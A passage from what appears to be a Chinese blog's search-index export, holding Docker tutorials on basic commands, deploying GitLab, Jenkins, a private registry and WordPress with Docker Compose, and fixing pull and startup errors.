<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 拉取镜像，TAG一般是指版本，可以不指定，默认是latest</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker pull REPOSITORY:TAG</span></span><br><span class="line">root@server:~# sudo docker pull hello-world</span><br><span class="line">root@server:~# sudo docker pull openjdk:8</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看本地镜像</span></span><br><span class="line">root@server:~# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">openjdk             8                   bec43387959a        7 days ago          625MB</span><br><span class="line">ubuntu              latest              d131e0fa2585        2 weeks ago         102MB</span><br><span class="line">hello-world         latest              fce289e99eb9        4 months ago        1.84kB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除本地镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker rmi IMAGE_ID </span></span><br><span class="line">root@server:~# sudo docker rmi fce28 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 前台运行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker run NAME</span></span><br><span class="line">root@server:~# sudo docker run hello-world</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看运行中的容器</span></span><br><span class="line">root@server:~# sudo docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND</span><br><span class="line">408bd2d9fe7c        hello-world         "/hello"                     </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker rm CONTAINER_ID</span></span><br><span class="line">root@server:~# sudo docker rm 408b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后台运行</span></span><br><span class="line">root@server:~# sudo docker run -d ubuntu</span><br><span class="line">51028c9c4d404a0b0382dd6e91b0a985980832c537ed0d02ffe932a37cb101c6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭（后台运行,前台的不需要stop）</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker stop CONTAINER_ID</span></span><br><span class="line">root@server:~# sudo docker stop 51028c</span><br><span class="line">51028c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 守护进程运行</span></span><br><span class="line">root@server:~# sudo docker run --restart=always hello-world</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 端口映射</span></span><br><span class="line">root@server:~# sudo docker run -d -p 8080:8080 hello-world</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入容器的bash</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker <span class="built_in">exec</span> -it CONTAINER_ID bash</span></span><br><span class="line">root@server:~# sudo docker exec -it d131e0fa2585 bash</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索镜像</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@server:~# docker search nginx</span><br><span class="line">NAME                  DESCRIPTION                    STARS               OFFICIAL</span><br><span class="line">nginx                 Official build of Nginx.       11403               [OK]</span><br><span class="line">tobi312/rpi-nginx     NGINX on Raspberry Pi / ARM    26</span><br><span class="line">bitnami/nginx         Bitnami nginx Docker Image     66</span><br></pre></td></tr></table></figure>
<p> 其中，<br> <code>STARS</code>：收藏数，表示该镜像的受关注程度<br> <code>OFFICIAL</code> ：是否官方创建维护</p>
</li>
<li><p>镜像加速<a href="https://www.docker-cn.com/registry-mirror" target="_blank" rel="noopener">Docker 中国官方镜像加速</a></p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://registry.docker-cn.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>七、Docker-部署Gitlab</title>
    <url>/docker/%E4%B8%83%E3%80%81Docker-%E9%83%A8%E7%BD%B2Gitlab/</url>
    <content><![CDATA[<p>以下三部分内容都是来自：<a href="https://docs.gitlab.com/omnibus/docker/" target="_blank" rel="noopener">【Gitlab文档】</a></p>
<blockquote>
<p>注意，Gitlab至少需要2G内存来跑</p>
</blockquote>
<h2 id="一、docker方式：域名"><a href="#一、docker方式：域名" class="headerlink" title="一、docker方式：域名"></a>一、docker方式：域名</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo docker pull gitlab/gitlab-ce:latest</span><br><span class="line">$ sudo docker run --detach \</span><br><span class="line">--hostname gitlab.example.com \</span><br><span class="line">--publish 443:443 --publish 80:80 --publish 22:22 \</span><br><span class="line">--name gitlab \</span><br><span class="line">--restart always \</span><br><span class="line">--volume /srv/gitlab/config:/etc/gitlab \</span><br><span class="line">--volume /srv/gitlab/logs:/var/<span class="built_in">log</span>/gitlab \</span><br><span class="line">--volume /srv/gitlab/data:/var/opt/gitlab \</span><br><span class="line">gitlab/gitlab-ce:latest</span><br></pre></td></tr></table></figure>
<h2 id="二、docker方式：IP"><a href="#二、docker方式：IP" class="headerlink" title="二、docker方式：IP"></a>二、docker方式：IP</h2><p>假如公网IP： <code>192.168.0.200</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --detach \</span><br><span class="line">  --hostname gitlab.example.com \</span><br><span class="line">  --publish 192.168.0.200:443:443 \</span><br><span class="line">  --publish 192.168.0.200:80:80 \</span><br><span class="line">  --publish 192.168.0.200:22:22 \</span><br><span class="line">  --name gitlab \</span><br><span class="line">  --restart always \</span><br><span class="line">  --volume /srv/gitlab/config:/etc/gitlab \</span><br><span class="line">  --volume /srv/gitlab/logs:/var/<span class="built_in">log</span>/gitlab \</span><br><span class="line">  --volume /srv/gitlab/data:/var/opt/gitlab \</span><br><span class="line">  gitlab/gitlab-ce:latest</span><br></pre></td></tr></table></figure>
<p>运行时出现错误（可能要注释掉指定22端口）：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker: Error response from daemon:</span><br><span class="line"> driver failed programming external connectivity on endpoint gitlab</span><br><span class="line"> (b24b2757ac70353b9ea1f24ebdbaa9244fe614444619e604c3d29dc3d17ddce6):</span><br><span class="line">  Error starting userland proxy: listen tcp 192.168.0.200:22: </span><br><span class="line">  <span class="built_in">bind</span>: address already <span class="keyword">in</span> use.</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>非Docker安装Gitlab并不会和SSH的端口22产生冲突</p>
</blockquote>
<h2 id="三、docker-compose方式（推荐）"><a href="#三、docker-compose方式（推荐）" class="headerlink" title="三、docker-compose方式（推荐）"></a>三、docker-compose方式（推荐）</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">web:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">'gitlab/gitlab-ce:latest'</span></span><br><span class="line">  <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">hostname:</span> <span class="string">'gitlab.example.com'</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="attr">GITLAB_OMNIBUS_CONFIG:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">external_url</span> <span class="string">'http://gitlab.example.com'</span></span><br><span class="line">      <span class="comment"># 这里可以填 gitlab.rb 的配置信息</span></span><br><span class="line">      <span class="string">gitlab_rails['time_zone']</span> <span class="string">=</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'80:80'</span></span><br><span class="line">    <span class="comment">#- '443:443'</span></span><br><span class="line">    <span class="comment">#- '22:22'</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'/srv/gitlab/config:/etc/gitlab'</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'/srv/gitlab/logs:/var/log/gitlab'</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'/srv/gitlab/data:/var/opt/gitlab'</span></span><br></pre></td></tr></table></figure>
<p>经过验证，Gitlab可以跑起来。</p>
<h2 id="四、汉化版"><a href="#四、汉化版" class="headerlink" title="四、汉化版"></a>四、汉化版</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">gitlab:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">'twang2218/gitlab-ce-zh:9.4'</span></span><br><span class="line">      <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">      <span class="attr">hostname:</span> <span class="string">'gitlab.example.com'</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">TZ:</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line">        <span class="attr">GITLAB_OMNIBUS_CONFIG:</span> <span class="string">|</span></span><br><span class="line">          <span class="string">external_url</span> <span class="string">'http://gitlab.example.com'</span></span><br><span class="line">          <span class="string">gitlab_rails['time_zone']</span> <span class="string">=</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">'80:9999'</span></span><br><span class="line">          <span class="comment">#- '443:443'</span></span><br><span class="line">          <span class="comment">#- '22:22'</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/home/fantj/app/docker/compose/gitlab/config:/etc/gitlab</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/home/fantj/app/docker/compose/gitlab/data:/var/opt/gitlab</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/home/fantj/app/docker/compose/gitlab/logs:/var/log/gitlab</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>三、Docker-私服镜像Registry</title>
    <url>/docker/%E4%B8%89%E3%80%81Docker-%E7%A7%81%E6%9C%8D%E9%95%9C%E5%83%8FRegistry/</url>
    <content><![CDATA[<p>私服镜像管理：registry<br>私服镜像WebUI：konradkleine/docker-registry-frontend:v2</p>
<p>registry只提供一个RESTful API，docker-registry-frontend是第三方开发者实现的可视化，典型的前后端分离架构。</p>
<h2 id="docker命令启动"><a href="#docker命令启动" class="headerlink" title="docker命令启动"></a>docker命令启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker pull registry</span><br><span class="line">$ docker run -d -p 5000:5000 --restart=always --name registry registry:2</span><br></pre></td></tr></table></figure>
<h2 id="单独registry的compose文件"><a href="#单独registry的compose文件" class="headerlink" title="单独registry的compose文件"></a>单独registry的compose文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &apos;3.7&apos;</span><br><span class="line">services:</span><br><span class="line">  registry:</span><br><span class="line">    image: registry:2</span><br><span class="line">	restart: always</span><br><span class="line">    container_name: registry</span><br><span class="line">    ports: </span><br><span class="line">     - 5000:5000</span><br><span class="line">    volumes:</span><br><span class="line">     - /usr/local/docker/registry/data:/var/lib/registry</span><br></pre></td></tr></table></figure>
<p>单独部署registry已经可以使用镜像的上传和下载了，查看私服上的镜像只能通过RESTful API来查看，如果需要可视化环境，还需要部署一个webUI镜像，往下走…</p>
<h2 id="registry和WebUI一起编排的compose文件"><a href="#registry和WebUI一起编排的compose文件" class="headerlink" title="registry和WebUI一起编排的compose文件"></a>registry和WebUI一起编排的compose文件</h2><p>在webUI上可以查看上传的镜像<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &apos;3.7&apos;</span><br><span class="line">services:</span><br><span class="line">  registry:</span><br><span class="line">    image: registry:2</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: registry</span><br><span class="line">    ports: </span><br><span class="line">     - 5000:5000</span><br><span class="line">    volumes:</span><br><span class="line">     - /usr/local/docker/registry/data:/var/lib/registry</span><br><span class="line">  frontend:</span><br><span class="line">    image: konradkleine/docker-registry-frontend:v2</span><br><span class="line">    ports: </span><br><span class="line">     - 8080:80</span><br><span class="line">    volumes:</span><br><span class="line">     - ./certs/frontend.crt:/etc/apache2/server.crt:ro</span><br><span class="line">     - ./certs/frontend.key:/etc/apache2/server.key:ro</span><br><span class="line">    environment:</span><br><span class="line">     - ENV_DOCKER_REGISTRY_HOST=127.0.0.1</span><br><span class="line">     - ENV_DOCKER_REGISTRY_PORT=5000</span><br></pre></td></tr></table></figure></p>
<h2 id="在要使用私服的机器配置Docker"><a href="#在要使用私服的机器配置Docker" class="headerlink" title="在要使用私服的机器配置Docker"></a>在要使用私服的机器配置Docker</h2><p>修改docker配置文件 daemon.json ，加入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&quot;insecure-registries&quot;:[</span><br><span class="line">	&quot;IP:5000&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">$ docker info</span><br></pre></td></tr></table></figure></p>
<h2 id="上传镜像到私服"><a href="#上传镜像到私服" class="headerlink" title="上传镜像到私服"></a>上传镜像到私服</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker push IP:5000/tomcat</span><br></pre></td></tr></table></figure>
<h2 id="从私服下载镜像"><a href="#从私服下载镜像" class="headerlink" title="从私服下载镜像"></a>从私服下载镜像</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker pull IP:5000/tomcat:VERSION</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker,registry</tag>
      </tags>
  </entry>
  <entry>
    <title>二、Docker-Compose</title>
    <url>/docker/%E4%BA%8C%E3%80%81Docker-Compose/</url>
    <content><![CDATA[<p>Docker Compose 是 Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用。</p>
<h2 id="下载-Docker-Compose"><a href="#下载-Docker-Compose" class="headerlink" title="下载 Docker Compose:"></a>下载 Docker Compose:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="修改为可执行文件"><a href="#修改为可执行文件" class="headerlink" title="修改为可执行文件:"></a>修改为可执行文件:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="compose编排一个服务"><a href="#compose编排一个服务" class="headerlink" title="compose编排一个服务"></a>compose编排一个服务</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir test-tomcat</span><br><span class="line">$ cd test-tomcat</span><br><span class="line">$ vim docker-compose.yml </span><br><span class="line">version: &apos;3.7&apos;</span><br><span class="line">services: </span><br><span class="line">  mytomcat:</span><br><span class="line">    restart: always</span><br><span class="line">    image: tomcat</span><br><span class="line">    container_name: mytomcat</span><br><span class="line">    ports: </span><br><span class="line">     - &quot;8080:8080&quot;</span><br></pre></td></tr></table></figure>
<h2 id="compose编排多个服务"><a href="#compose编排多个服务" class="headerlink" title="compose编排多个服务"></a>compose编排多个服务</h2><p><img src="/images/Web后端/compose编排多个服务.png" alt="compose编排多个服务.png"></p>
<h2 id="compose启动"><a href="#compose启动" class="headerlink" title="compose启动"></a>compose启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose up</span><br></pre></td></tr></table></figure>
<h2 id="compose守护启动"><a href="#compose守护启动" class="headerlink" title="compose守护启动"></a>compose守护启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose up -d</span><br><span class="line">$ docker-compose logs mytomcat</span><br></pre></td></tr></table></figure>
<h2 id="compose关闭"><a href="#compose关闭" class="headerlink" title="compose关闭"></a>compose关闭</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose down</span><br><span class="line">$ docker ps -a</span><br></pre></td></tr></table></figure>
<h2 id="compose关闭并删除volumes数据"><a href="#compose关闭并删除volumes数据" class="headerlink" title="compose关闭并删除volumes数据"></a>compose关闭并删除volumes数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker-compose down --volumes</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>五、Docker-拉镜像网络错误</title>
    <url>/docker/%E4%BA%94%E3%80%81Docker-%E6%8B%89%E9%95%9C%E5%83%8F%E7%BD%91%E7%BB%9C%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>当访问 <code>registry-1.docker.io</code> 出错时，可能是DNS问题，可以通过手动加HOST记录来临时解决。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/# docker-compose up</span><br><span class="line">Pulling db (mysql:5.7)...</span><br><span class="line">ERROR: Get https://registry-1.docker.io/v2/library/mysql/manifests/5.7: Get https://auth.docker.io/token?scope=repository%3Alibrary%2Fmysql%3Apull&amp;service=registry.docker.io: dial tcp: lookup auth.docker.io: Temporary failure in name resolution</span><br><span class="line"></span><br><span class="line"># 通过dig查找可用IP</span><br><span class="line">root@ubuntu:~/# dig @114.114.114.114 registry-1.docker.io</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; @114.114.114.114 registry-1.docker.io</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56865</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;registry-1.docker.io.		IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">registry-1.docker.io.	33	IN	A	52.22.201.61</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.199.77.19</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.233.151.211</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.228.211.243</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.232.31.24</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.206.236.31</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.201.236.93</span><br><span class="line">registry-1.docker.io.	33	IN	A	34.201.196.144</span><br><span class="line"></span><br><span class="line">;; Query time: 25 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114)</span><br><span class="line">;; WHEN: Wed Jun 19 10:33:14 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 177</span><br><span class="line"></span><br><span class="line"># 将某条记录加上hosts文件</span><br><span class="line">root@ubuntu:~/# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">34.199.77.19 registry-1.docker.io</span><br><span class="line"># 重试</span><br><span class="line">root@ubuntu:~/# docker-compose up</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>八、Docker-部署Jenkins</title>
    <url>/docker/%E5%85%AB%E3%80%81Docker-%E9%83%A8%E7%BD%B2Jenkins/</url>
    <content><![CDATA[<p><a href="https://github.com/jenkinsci/docker" target="_blank" rel="noopener">【参考】</a></p>
<h2 id="1-简单"><a href="#1-简单" class="headerlink" title="1. 简单"></a>1. 简单</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -p 8080:8080 -p 50000:50000 -u 0 jenkins/jenkins:lts</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-u 0 :表示已root账号启动镜像（镜像内部使用的用户是 jenkins ）</p>
</blockquote>
<h2 id="2-带jenkins-home"><a href="#2-带jenkins-home" class="headerlink" title="2. 带jenkins_home"></a>2. 带jenkins_home</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts</span><br></pre></td></tr></table></figure>
<h2 id="3-docker-compose配置文件"><a href="#3-docker-compose配置文件" class="headerlink" title="3. docker-compose配置文件"></a>3. docker-compose配置文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">version: <span class="string">'3.3'</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  jenkins:</span><br><span class="line">    image: jenkins/jenkins:lts</span><br><span class="line">    restart: always</span><br><span class="line">    user: root</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">'8080:8080'</span></span><br><span class="line">      - <span class="string">'50000:50000'</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">'/usr/jenkins/jenkins_home:/var/jenkins_home'</span></span><br><span class="line">      - <span class="string">'/usr/bin/docker:/usr/bin/docker'</span></span><br><span class="line">      - <span class="string">'/var/run/docker.sock:/var/run/docker.sock'</span></span><br><span class="line">      - <span class="string">'/etc/localtime:/etc/localtime:ro'</span></span><br></pre></td></tr></table></figure>
<p><strong>日志：</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jenkins_1  | INFO: </span><br><span class="line">jenkins_1  | </span><br><span class="line">jenkins_1  | *************************************************************</span><br><span class="line">jenkins_1  | *************************************************************</span><br><span class="line">jenkins_1  | *************************************************************</span><br><span class="line">jenkins_1  | </span><br><span class="line">jenkins_1  | Jenkins initial setup is required. An admin user has been created and a password generated.</span><br><span class="line">jenkins_1  | Please use the following password to proceed to installation:</span><br><span class="line">jenkins_1  | </span><br><span class="line">jenkins_1  | e526cf02d4bb4c3b9e91df6dea9bdda5</span><br><span class="line">jenkins_1  | </span><br><span class="line">jenkins_1  | This may also be found at: /var/jenkins_home/secrets/initialAdminPassword</span><br><span class="line">jenkins_1  | </span><br><span class="line">jenkins_1  | *************************************************************</span><br><span class="line">jenkins_1  | *************************************************************</span><br><span class="line">jenkins_1  | *************************************************************</span><br></pre></td></tr></table></figure></p>
<p>密码路径：<code>/var/jenkins_home/secrets/initialAdminPassword</code></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>六、Docker-无法启动</title>
    <url>/docker/%E5%85%AD%E3%80%81Docker-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<h2 id="控制docker"><a href="#控制docker" class="headerlink" title="控制docker"></a><a href="https://docs.docker.com/config/daemon/systemd/" target="_blank" rel="noopener">控制docker</a></h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start docker</span><br><span class="line">或者</span><br><span class="line">$ sudo service docker start</span><br></pre></td></tr></table></figure>
<h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>当尝试用docker时，提示以下错误<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># docker ps -a</span></span><br><span class="line">Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</span><br><span class="line">root@bogon:~<span class="comment"># docker images</span></span><br><span class="line">Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment"># systemctl status docker.service</span></span><br><span class="line">● docker.service - LSB: Create lightweight, portable, self-sufficient containers.</span><br><span class="line">   Loaded: loaded (/etc/init.d/docker; bad; vendor preset: enabled)</span><br><span class="line">   Active: failed (Result: <span class="built_in">exit</span>-code) since Mon 2019-07-08 10:52:45 CST; 10s ago</span><br><span class="line">     Docs: man:systemd-sysv-generator(8)</span><br><span class="line">  Process: 19187 ExecStart=/etc/init.d/docker start (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: Stopped LSB: Create lightweight, portable, self-sufficient containers..</span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: Starting LSB: Create lightweight, portable, self-sufficient containers....</span><br><span class="line">Jul 08 10:52:45 bogon docker[19187]:  * /usr/bin/dockerd not present or not executable</span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: docker.service: Control process exited, code=exited status=1</span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: Failed to start LSB: Create lightweight, portable, self-sufficient containers..</span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: docker.service: Unit entered failed state.</span><br><span class="line">Jul 08 10:52:45 bogon systemd[1]: docker.service: Failed with result <span class="string">'exit-code'</span>.</span><br><span class="line"></span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment"># systemctl restart docker.service</span></span><br><span class="line">Job <span class="keyword">for</span> docker.service failed because the control process exited with error code. See <span class="string">"systemctl status docker.service"</span> and <span class="string">"journalctl -xe"</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure></p>
<h2 id="卸载重装"><a href="#卸载重装" class="headerlink" title="卸载重装"></a>卸载重装</h2><p>暂时没找到好的方法，只能重装了。这里用 <code>--purge</code>卸载及删除配置文件，但是docker镜像不会被删除。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># sudo apt-get remove docker-ce --purge</span></span><br><span class="line">root@bogon:~<span class="comment"># apt-get install docker-ce</span></span><br><span class="line">root@bogon:~<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS               NAMES</span><br><span class="line">7598613e479b        grafana/grafana     <span class="string">"/run.sh"</span>                2 months ago        Exited (0) 2 months ago                       grafana</span><br><span class="line">bf7a8866a780        influxdb            <span class="string">"/entrypoint.sh infl…"</span>   2 months ago        Exited (0) 3 weeks ago                        influxDbService</span><br><span class="line">bab8133e7c9e        hello-world         <span class="string">"/hello"</span>                 2 months ago        Exited (0) 2 months ago                       reverent_euclid</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>网站文档Slate</title>
    <url>/docs%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/%E7%BD%91%E7%AB%99%E6%96%87%E6%A1%A3Slate/</url>
    <content><![CDATA[<p><a href="https://github.com/lord/slate" target="_blank" rel="noopener">Slate </a> 可帮助您创建美观，智能，响应式的 API 文档</p>
<p>要Ruby环境，用markdown编写文档。使用方法看官方文档</p>
<p>预览图：</p>
<p><img src="https://raw.githubusercontent.com/lord/img/master/screenshot-slate.png" alt></p>
<p><img src="https://oscimg.oschina.net/oscnet/1dcaa0be1652339164401f7686985b0bc62.jpg" alt></p>
]]></content>
      <categories>
        <category>docs文档工具</category>
      </categories>
      <tags>
        <tag>docs</tag>
      </tags>
  </entry>
  <entry>
    <title>四、Docker-部署WordPress站点</title>
    <url>/docker/%E5%9B%9B%E3%80%81Docker-%E9%83%A8%E7%BD%B2WordPress%E7%AB%99%E7%82%B9/</url>
    <content><![CDATA[<p>本文利用 <code>Docker Compose</code> 快速部署一个WordPress站点。</p>
<p>环境：VMWare 、Ubuntu 、 Docker</p>
<h2 id="编写docker-compose-yml文件"><a href="#编写docker-compose-yml文件" class="headerlink" title="编写docker-compose.yml文件"></a>编写docker-compose.yml文件</h2><p><a href="https://docs.docker.com/compose/wordpress/" target="_blank" rel="noopener">参考docs.docker.com</a><br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">db:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db_data:/var/lib/mysql</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">environment:</span></span><br><span class="line">       <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">MYSQL_DATABASE:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">MYSQL_USER:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">MYSQL_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">wordpress:</span></span><br><span class="line">     <span class="attr">depends_on:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">wordpress:latest</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"8000:80"</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">environment:</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_HOST:</span> 